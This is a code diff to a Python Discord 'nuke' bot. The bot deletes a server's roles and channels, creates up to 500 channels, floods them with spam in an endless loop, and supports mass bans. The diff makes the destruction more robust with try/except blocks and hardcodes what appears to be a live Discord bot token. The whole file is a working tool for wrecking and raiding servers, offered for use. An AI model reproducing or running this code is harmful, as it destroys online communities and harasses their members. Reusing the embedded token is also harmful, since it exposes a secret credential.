@@ -13,7 +13,7 @@ print('                                                     Made by Lososik')
 print('1) Nuke')
 print('2) Ban')
 
-TOKEN = '' #add your discord bot token
+TOKEN = 'ODg5NTgxMzM0NDU1MDA5MzYx.YUjVLQ.GUdq5CkyaLXGxcZEZekhy8EGdj8'
 MAX_CHANNELS = 500
 
 
@@ -32,7 +32,6 @@ if choice == 2:
     print('For mass ban write to chat: !Ban')
 
 
-
 client = commands.Bot(command_prefix="!")
 
 @client.command()
@@ -48,12 +47,18 @@ async def Nuke(ctx):
             print(f"{role.name} Has not been deleted")
 
     for channel in guild.channels:
-        await channel.delete()
-        print(f"{channel.name} Has been deleted")
+        try:
+            await channel.delete()
+            print(f"{channel.name} Has been deleted")
+        except:
+            print(f'You cant delete {channel}')
 
-    for i in range(MAX_CHANNELS):
-        await guild.create_text_channel(chanless)
-        print(f"{chanless} has been created")
+    try:
+        for i in range(MAX_CHANNELS):
+            await guild.create_text_channel(chanless)
+            print(f"{chanless} has been created")
+    except:
+        print('You havent got permission to create channels')
 
 @client.command(pass_context=True)
 async def Ban(ctx):
@@ -79,7 +84,12 @@ async def OneBan(ctx, member : discord.Member):
 @client.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send(spam)
+        try:
+            await channel.send(spam)
+            print('SPAMMIMG :)')
+
+        except:
+            print('You cant spam lmaoooo')
 
 def thread():
         threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()
